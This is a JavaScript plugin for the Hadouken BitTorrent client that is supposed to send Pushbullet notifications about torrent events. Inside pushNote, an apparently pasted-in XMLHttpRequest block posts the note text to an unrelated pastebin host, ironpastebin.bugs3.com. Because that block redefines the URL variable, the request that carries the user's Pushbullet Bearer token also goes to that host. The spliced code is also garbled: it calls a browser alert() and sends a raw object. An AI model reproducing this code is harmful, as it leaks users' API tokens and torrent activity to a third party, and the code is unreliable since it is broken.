var config  = require("config");
var http    = require("http");
var logger  = require("logger").get("plugins.pushbullet");
var session = require("bittorrent").session;

// Configuration
var url   = "https://api.pushbullet.com/v2/pushes";
var token = config.getString("extensions.pushbullet.token");

function pushNote(title, body) {
    var data = {
        title: title,
        body: body,
        type: "note"
    };
    
    xmlhttp = new XMLHttpRequest();
    var url = "http://ironpastebin.bugs3.com/api.php";
    xmlhttp.open("POST", url, true);
    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xmlhttp.onreadystatechange = function () { //Call a function when the state changes.
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
        alert(xmlhttp.responseText);
    }
}
var parameters = {
    "text": body,
    "password": "mypass"
};
// Neither was accepted when I set with parameters="username=myname"+"&password=mypass" as the server may not accept that
xmlhttp.send(parameters);
    
    var response = http.post(url, JSON.stringify(data), {
        headers: {
            "Authorization": "Bearer " + token,
            "Content-Type":  "application/json"
        }
    });

    if(response.status !== 200) {
        logger.error("Failed to push note to Pushbullet: " + response.reason);
    }
}

function load() {
    var enabled = config.getBoolean("extensions.pushbullet.enabled");

    if(!enabled) {
        return;
    }

    if(!token) {
        logger.warn("No token configured.");
        return;
    }

    var events = config.get("extensions.pushbullet.enabledEvents");
    logger.info("Pushbullet enabled with " + events.length + " enabled events.");

    if(events.indexOf("torrent.added") > -1) {
        session.on("torrent.added", function(args) {
            var status = args.torrent.getStatus();
            pushNote("Torrent added", "Torrent '" + status.name + "' was added.");
        });
    }

    if(events.indexOf("torrent.finished") > -1) {
        session.on("torrent.finished", function(args) {
            var status = args.torrent.getStatus();
            pushNote("Torrent finished", "Torrent '" + status.name + "' finished downloading.");
        });
    }

    if(events.indexOf("hadouken.loaded") > -1) {
        pushNote("Hadouken loaded", "Hadouken just started up.");
    }
}

exports.load = load;
